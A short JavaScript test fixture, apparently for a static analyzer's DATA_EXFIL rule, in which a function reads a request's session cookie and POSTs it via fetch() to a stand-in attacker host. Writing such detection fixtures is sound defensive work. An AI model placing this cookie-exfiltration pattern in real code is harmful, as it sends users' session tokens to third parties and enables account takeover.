// DATA_EXFIL: a session cookie (Sensitive-tier source) flows into the
// outbound body of fetch() at an attacker-controlled host. SSRF stays
// silent (URL is a static literal); DATA_EXFIL fires.
function leakBodyExternal(req) {
    var payload = req.cookies.session;
    fetch('https://untrusted.example.com/intake', {
        method: 'POST',
        body: payload,
    });
}
